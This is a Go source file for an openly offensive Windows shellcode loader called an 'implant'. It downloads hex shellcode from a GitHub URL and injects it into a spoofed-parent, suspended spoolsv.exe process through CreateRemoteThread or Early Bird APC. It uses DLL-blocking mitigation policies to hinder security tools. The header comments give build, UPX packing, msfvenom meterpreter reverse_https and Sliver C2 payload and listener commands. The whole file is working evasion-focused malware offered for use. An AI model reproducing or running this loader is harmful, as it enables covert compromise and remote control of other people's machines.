// IMPLANT of D00mfist
//
// DESCRIPTION
// Downloads shellcode hosted on Github or any Hosting Platform
//
//
// SETUP INSTRUCTIONS
// go get github.com/D00MFist/Go4aRun/pkg/sliversyscalls/syscalls
// go get golang.org/x/sys/windows
//
//
// QUICK USE
// Bash:  export GOPATH="$HOME/go"; export GOOS="windows"
// PSH:   $Env:GOOS = "windows"; $Env:GOARCH = "amd64"
// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" cmd/implant/main.go
//
//
// EDIT & BUILD
// 1. Change const url
// 2. Change block dll behavior: between "not allowing non-MS" and "only store" through nonms and onlystore vars
// 3. Change parentName var to change spoofed parent
// 4. Change programPath var to change process launched by parent which shellcode will inject into
// 5. Change creationFlags to change behavior of programPath var launching
// 6. Select a Proc Injection Method by comment/uncommenting the sections CreateRemoteThread or QueueUserAPC
//
// go build -a -gcflags=all="-l -B" -ldflags="-s -w -H=windowsgui" -o loader.exe cmd/implant/main.go // EXE
// go build -buildmode=c-shared -o loader.dll cmd/implant/main.go // DLL
//
//
// UPX PACKING - REDUZE FILESIZE
// upx --best --ultra-brute loader.exe
//
//
// HEX SHELLCODE FOR METASPLOIT
// msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<HOST> LPORT=<PORT> -b '\x00' -f hex -o shellcode.txt
// msfconsole
// use multi/handler
// set payload windows/x64/meterpreter/reverse_https
// set LHOST k.a.l.i
// set LPORT 8443
// run -j
//

// HEX SHELLCODE FOR SLIVER C2
// generate --os windows --format shellcode --http <HOST>:<PORT> --skip-symbols --arch x86
// generate --os windows --format shellcode --http <HOST>:<PORT> --skip-symbols --arch x64
// http -l <PORT>
//
//
// Convert Sliver Payload.bin to HEX by using Mgeeky's converter
// python2 bin2shellcode-mgeeky.py payload.bin > a
//
// Upload a to Github!
//
// Enjoy!
//
// Author: scaery
// Source: D00mfist
// Licence WTFWPL

package main

import (
	syscalls "github.com/D00MFist/Go4aRun/pkg/sliversyscalls/syscalls"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// CHANGE ME
const url = "https://raw.githubusercontent.com/scaery/implant/main/calc" 
// TEST 
//const url = "https://raw.githubusercontent.com/scaery/implant/main/cmd"
//const url = "https://raw.githubusercontent.com/scaery/implant/main/msf"
//const url = "https://raw.githubusercontent.com/scaery/implant/main/sliver"

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
)

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}

type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

func main() {

	//Enum and get the pid of specified process
	procThreadAttributeSize := uintptr(0)
	syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, err := syscalls.GetProcessHeap()
	attributeList, err := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"

	//Options for Block Dlls
	nonms := uintptr(0x100000000000) //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
	//onlystore := uintptr(0x300000000000) //"BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"

	//Update to block dlls
	syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
	//syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &onlystore, unsafe.Sizeof(onlystore), 0, nil)

	//Search for intended Spoofed Parent process
	procs, err := Processes()
	if err != nil {
		log.Fatal(err)
	}
	parentName := "explorer.exe" //Name of Spoofed Parent
	ParentInfo := FindProcessByName(procs, parentName)
	if ParentInfo != nil {
		ppid := uint32(ParentInfo.ProcessID)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintParentHandle := uintptr(parentHandle)
		syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		//startupInfo.ShowWindow = windows.SW_HIDE

		// CHANGE ME
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT

		// CHANGE ME
		programPath := "c:\\windows\\system32\\spoolsv.exe"
		//programPath := "c:\\windows\\system32\\dllhost.exe"
		//programPath := "c:\\windows\\system32\\notepad.exe"

		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)

		log.SetFlags(0)
		var netClient = &http.Client{Timeout: time.Second * 10}
		resp, err := netClient.Get(url)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}

		sc := string(bodyBytes)
		fmt.Printf("Beacon loaded!")
		//fmt.Printf("HEX Shellcode:  %s\n", sc)

		//run, err := hex.DecodeString(sc) // dont accept err
		decode, _ := hex.DecodeString(sc)

		// Inject into Process
		injectinto := int(procInfo.ProcessId)

        // CHANGE ME
		// A) CreateRemoteThread
		var Proc, R_Addr, F = WriteShellcode(injectinto, decode)
		ShellCodeCreateRemoteThread(Proc, R_Addr, F)
		// B) QueueUserAPC
		//var victimHandle = procInfo.Thread
		//var _, R_Addr, _ = WriteShellcode(injectinto, decode)
		//EBAPCQueue(R_Addr, victimHandle)
	}

}

func createHash(key string) []byte {
	hasher := md5.New()
	hasher.Write([]byte(key))
	slice := []byte(hex.EncodeToString(hasher.Sum(nil)))
	return slice
}

func Decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce, ciphertext := data[:gcm.NonceSize()], data[gcm.NonceSize():]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)

	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

// Process Functions
// Needed to enum process to get pid of process we want to spoof
const TH32CS_SNAPPROCESS = 0x00000002

// WindowsProcess is an implementation of Process for Windows.
type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func Processes() ([]WindowsProcess, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	// get the first process
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			// windows sends ERROR_NO_MORE_FILES on last process
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return &p
		}
	}
	return nil
}

func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
	OpenProcess         = kernel32.MustFindProc("OpenProcess")
	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
	QueueUserAPC        = kernel32.MustFindProc("QueueUserAPC")
)

func WriteShellcode(PID int, Shellcode []byte) (uintptr, uintptr, int) {
	var F int = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
	R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	WriteProcessMemory.Call(Proc, R_Addr, uintptr(unsafe.Pointer(&Shellcode[0])), uintptr(len(Shellcode)), uintptr(F))
	return Proc, R_Addr, F
}

//ShellCodeCreateRemoteThread spawns shellcode in a remote process using CreateRemoteThread
func ShellCodeCreateRemoteThread(Proc uintptr, R_Addr uintptr, F int) error {
	CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
	if CRTS == 0 {
		err := errors.New("[!] ERROR : Can't Create Remote Thread.")
		return err
	}
	_, _, errWaitForSingleObject := WaitForSingleObject.Call(Proc, 0, syscall.INFINITE)
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n")
	}

	return nil
}

//EBAPCQueue spawns shellcode in a remote process using Early Bird APC Queue Code Injection
func EBAPCQueue(R_Addr uintptr, victimHandle windows.Handle) error {
	_, _, errQueueUserAPC := QueueUserAPC.Call(R_Addr, uintptr(victimHandle), 0)
	if errQueueUserAPC.Error() != "The operation completed successfully." {
		err := errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
		return err
	}
	windows.ResumeThread(victimHandle)
	return nil
}
